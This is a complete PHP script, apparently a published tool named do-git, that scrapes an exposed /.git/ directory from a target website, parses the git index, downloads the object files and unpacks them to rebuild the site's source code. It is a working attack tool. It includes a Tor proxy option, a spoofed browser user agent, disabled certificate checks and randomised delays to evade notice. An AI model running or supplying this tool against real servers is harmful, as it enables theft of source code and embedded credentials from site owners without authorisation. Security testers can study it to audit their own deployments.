<?php
/**
 * Downloader Git Folder v0.0.2.1 (do-git)
 * CLI && WEB version
 *
 * @description Downloader && Unpacker /.git/ (folder/files) repository without --bare
 * @author 5ms.ru
 * @link https://github.com/5ms/do-git
 * @date 23.11.2015
 */

set_time_limit(0);

if (PHP_SAPI == 'cli') {
	$usage = 'usage: php ' . basename($_SERVER['PHP_SELF']) . ' -u http://target/.git/ -l -t';
	$opt = getopt("u:l:t");
	$nl = PHP_EOL;
} else {
	$usage = 'usage: ' . $_SERVER['PHP_SELF'] . '?u=http://target/.git/&l&t';
	$opt = $_GET;
	$nl = '<br/>';
}

if (empty($opt['u'])
	|| !filter_var($opt['u'], FILTER_VALIDATE_URL)
	|| !($data = parse_url($opt['u']))
	|| empty($data['host'])) {
	exit($usage);
}

if (substr($opt['u'], -1) != '/') {
	$opt['u'] .= '/';
}

define('URL', $opt['u']);
define('LOG', isset($opt['l']));
define('TOR', isset($opt['t']));

$structure = array(
	'' => array(
		'index',        // not empty repository
		'config',
		'description',
		'packed-refs',
		'FETCH_HEAD',
		'HEAD',
		'ORIG_HEAD',
	),
	'logs/' => array(
		'HEAD',
	),
	'objects/' => array(

	),
	'hooks/' => array(

	),
	'info/' => array(

	),
	'refs/' => array(

	),
);

$dir = './' . $data['host'] . '/';
$git = $dir . '.git/';

foreach ($structure as $path => $file) {
	if (!is_dir($git . $path)) {
		mkdir($git . $path, 0777, true);
		chmod($git . $path, 0777);
	}
	if (!empty($file)) {
		for ($i = 0, $ic = count($file); $i < $ic; $i++) {
			if (file_exists($git . $path . $file[$i]) && filesize($git . $path . $file[$i]) > 0) {
				continue;
			}
			$http_code = 0;
			if (($data = get(URL . $path . $file[$i], $http_code)) && $http_code == 200) {
				file_put_contents($git . $path . $file[$i], $data);
			}
			elseif ($file[$i] == 'index') {
				exit('no .git');
			}
		}
	}
}

$size = filesize($git . 'index');
$fn = fopen($git . 'index', 'r');

if (!($signature = fread($fn, 4)) || $signature != 'DIRC') {
	exit('.git index is corrupted');
}

$version  = fread($fn, 4);
$entries  = fread($fn, 4);
$download = 0;
$unpacked = 0;
$failure  = 0;
$packed   = 0;

while (!feof($fn) && $size - ftell($fn) >= 64) {

	$null = fread($fn, 4);  // ctime seconds
	if ($null == 'TREE') {
		break;
	}

	$null = fread($fn, 4);  // ctime nanosecond
	$null = fread($fn, 4);  // mtime seconds
	$null = fread($fn, 4);  // mtime nanosecond
	$null = fread($fn, 4);  // dev
	$null = fread($fn, 4);  // ino
	$null = fread($fn, 4);  // mode
	$null = fread($fn, 4);  // uid
	$null = fread($fn, 4);  // gid
	$null = fread($fn, 4);  // file size

	$subdir = fread($fn, 1);

	$get = URL . 'objects/' . bin2hex($subdir) . '/';
	$target = $git . 'objects/' . bin2hex($subdir) . '/';

	if (!is_dir($target)) {
		mkdir($target, 0777);
		chmod($target, 0777);
	}

	$file     = bin2hex(fread($fn, 19));
	$null     = fread($fn, 1);
	$length   = fread($fn, 1);
	$original = fread($fn, hexdec(bin2hex($length)));

	$null = fread($fn, 8 - (40 + 1 + 19 + 1 + 1 + hexdec(bin2hex($length))) % 8); // padding block

	$get .= $file;
	$target .= $file;

	if (!file_exists($target)) {

		$http_code = 0;
		$data      = get($get, $http_code);

		if ($http_code == 200) {
			file_put_contents($target, $data);
			$download++;
		} elseif ($http_code == 404) {              // if object not found then file packed
			touch($target);
			$packed++;
			if (LOG) {
				echo '[PACKED] - ';
			}
		} else {
			$failure++;
			if (LOG) {
				echo '[FAIL] - ';
			}
		}

		usleep(rand(100000, 1000000));
	}

	if (file_exists($target)
		&& filesize($target) > 0
		&& !file_exists($dir . $original)) {

		if (!is_dir($dir . dirname($original))) {
			mkdir($dir . dirname($original), 0777, true);
		}

		if ($data = @gzuncompress(file_get_contents($target))) {
			file_put_contents($dir . $original, preg_replace('/^[a-z]+ [0-9]+\x00/', '', $data));
			$unpacked++;
			if (LOG) {
				echo '[UNPACK] - ';
			}
		} else {
			if (LOG) {
				echo '[FAIL UNPACK] - ';
			}
			$failure++;
		}
	}

	if (LOG) {
		echo $original . ' - ' . $get . '' . $nl;
	}
}

fclose($fn);

echo 'download: ' . $download . $nl;
if ($unpacked > 0) {
	echo 'unpacked: ' . $unpacked . $nl;
}
if ($packed > 0) {
	echo 'packed: ' . $packed . $nl;
}
if ($failure > 0) {
	echo 'failure: ' . $failure . $nl;
}


function get($url, &$http_code = 0) {

	if (!function_exists('curl_init')) {
		die('no curl');
	}

	$curl = curl_init($url);

	if (TOR) {
		curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
		curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:9050');
	}

	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_HEADER, false);
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 0);
	curl_setopt($curl, CURLOPT_TIMEOUT, 120);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($curl, CURLOPT_REFERER, '-');
	curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0');

	$page = curl_exec($curl);

	$info = curl_getinfo($curl);
	$http_code = $info['http_code'];

	curl_close($curl);

	return $page;
}